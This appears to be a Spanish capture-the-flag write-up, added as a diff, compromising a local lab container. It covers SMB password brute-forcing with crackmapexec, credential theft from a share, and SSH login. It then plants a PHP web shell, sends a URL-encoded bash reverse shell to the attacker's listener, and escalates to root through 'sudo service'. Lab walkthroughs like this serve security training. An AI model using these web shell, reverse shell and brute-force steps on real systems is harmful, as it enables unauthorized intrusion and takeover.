@@ -1,0 +1,218 @@
+# Enumeracion de Puertos, Servicios y Versiones
+
+nmap -Pn -n -sS -p- -sCV --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+
+# Fuzzing Web
+
+feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js
+                                                                                                                                                                        
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://172.17.0.2
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [txt, php, bak, db, py, html, js]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       94l      263w     3543c http://172.17.0.2/
+200      GET      815l     4335w    72694c http://172.17.0.2/info.php
+200      GET       94l      263w     3543c http://172.17.0.2/index.php
+200      GET      191l      440w     5229c http://172.17.0.2/productos.php
+[####################] - 41s  1661096/1661096 0s      found:4       errors:2      
+[####################] - 40s  1661032/1661032 41525/s http://172.17.0.2/
+
+revise el servicio web pero no consegui nada de interes...
+
+
+# Servicio SMB
+
+Enumeramos informacion con enum4linux:
+
+enum4linux -a 172.17.0.2
+
+========================================( Users on 172.17.0.2 )========================================
+user:[usuario1] rid:[0x3e8]
+user:[usuario3] rid:[0x3ea]
+user:[administrador] rid:[0x3ec]
+user:[usuario2] rid:[0x3e9]
+user:[satriani7] rid:[0x3eb]
+=======================================================================================================
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\ubuntu (Local User)
+S-1-22-1-1001 Unix User\usuario1 (Local User)
+S-1-22-1-1002 Unix User\usuario2 (Local User)
+S-1-22-1-1003 Unix User\usuario3 (Local User)
+S-1-22-1-1004 Unix User\satriani7 (Local User)
+S-1-22-1-1005 Unix User\administrador (Local User)
+
+========================================================================================================
+
+ahora realizo un ataque de diccionario al user smb satriani7 con hydra pero da error, asi que aplico
+el ataque con crackmapexec
+
+crackmapexec smb 172.17.0.2 -u satriani7 -p /home/darks/Desktop/linux/Kali/diccionarios/rockyou.txt
+SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent 
+
+me conecto via smbmap:
+
+smbmap -u satriani7 -p 50cent -H 172.17.0.2
+
+[+] IP: 172.17.0.2:445	Name: chat.chatme.dl      	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	myshare                                           	READ ONLY	Carpeta compartida sin restricciones
+	backup24                                          	READ ONLY	Privado
+	home                                              	NO ACCESS	Produccion
+	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
+[*] Closed 1 connections
+
+ahora me conecto via smbclient
+
+smbclient //172.17.0.2/backup24 -U satriani7%50cent
+
+aqui una vez conectado revisando los directorios me consigo en la ubicacion: /Documents/personal 2 archivos de los cuales
+me descargo el archivo: credentials.txt 
+
+get credentials.txt
+
+y tras chequearlo en mi maquina local me consigo con lo siguiente:
+
+=================================================================================================
+# Archivo de credenciales
+
+Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.
+
+Usuarios:
+-------------------------------------------------
+1. Usuario: jsmith
+   - Contraseña: PassJsmith2024!
+
+2. Usuario: abrown
+   - Contraseña: PassAbrown2024!
+
+3. Usuario: lgarcia
+   - Contraseña: PassLgarcia2024!
+
+4. Usuario: kchen
+   - Contraseña: PassKchen2024!
+
+5. Usuario: tjohnson
+   - Contraseña: PassTjohnson2024!
+
+6. Usuario: emiller
+   - Contraseña: PassEmiller2024!
+   
+7. Usuario: administrador
+    - Contraseña: Adm1nP4ss2024   
+
+8. Usuario: dwhite
+   - Contraseña: PassDwhite2024!
+
+9. Usuario: nlewis
+   - Contraseña: PassNlewis2024!
+
+10. Usuario: srodriguez
+   - Contraseña: PassSrodriguez2024!
+
+
+
+> Notas:
+- Mantener estas credenciales en un lugar seguro.
+- Cambiar las contraseñas periódicamente.
+- No compartir estas credenciales sin autorización.
+=============================================================================================================
+
+de aqui observo que existen credenciales del user {administrador}, mismo usuario que se reporto como user local
+del sistema en el reporte de enum4linux, asi que chequeo si las credenciales son validas para el servicio ssh
+que esta levantado
+
+ssh administrador@172.17.0.2
+pass:Adm1nP4ss2024
+
+!Hemos accedido al sistema como el user administrador!
+
+# Escalada de Privilegios
+
+/bin/bash
+
+despues de un rato buscando no consigo la manera de escalar privilegios desde este user, asi que revisandos
+en /var/www/html observo que el propietario del directorio es el user administrador por lo que puedo escribir
+en el...
+
+ls -la /var/www/html/
+total 484
+drwxrwxrwx 1 administrador administrador   4096 Oct  6 23:40 .
+drwxr-xr-x 1 root          root            4096 Oct  6 07:31 ..
+-rw-r--r-- 1 root          root          463383 Oct  6 07:59 back.png
+-rw-r--r-- 1 root          root            3543 Oct  6 20:28 index.php
+-rwxrwxr-x 1 administrador administrador     21 Oct  6 07:32 info.php
+-rw-r--r-- 1 root          root            5229 Oct  6 09:21 productos.php
+-rw-r--r-- 1 root          root             263 Oct  6 09:22 styles.css
+
+ahora lo que hare sera crear un php malicioso para la ejecucion de comandos
+
+nano /var/www/html/access.php
+
+<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
+
+Ctrl+o
+Ctrl+x
+
+ahora comprobamos la ejecucion de comandos:
+
+curl 'http://172.17.0.2/access.php?cmd=whoami'  
+<pre>www-data
+</pre> 
+
+tenemos ejecucion de comandos, asi que me coloco en escucha por netcat y enviamos una revershell:
+
+nc -lnvp 4444
+
+ahora enviamos la revershell:
+
+curl "http://172.17.0.2/access.php?cmd=%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%37%32%2e%31%37%2e%30%2e%31%2f%34%34%34%34%20%30%3e%26%31%22"
+
+y conseguimos el acceso nuevamento pero como el user www-data
+
+script /dev/null -c bash
+stty raw -echo; fg
+reset xterm
+stty rows 38 columns 168
+export TERM=xterm
+export SHELL=bash
+sudo -l
+
+User www-data may run the following commands on ac6c202b6e08:
+    (ALL) NOPASSWD: /usr/sbin/service
+
+si buscamos el binario con searchbins:
+
+searchbins -b service -f sudo
+
+	| sudo service ../../bin/sh
+
+asi que procedemos con la escalada a root ya que podemos ejecutar service como root
+
+sudo service ../../bin/bash
+
+#root
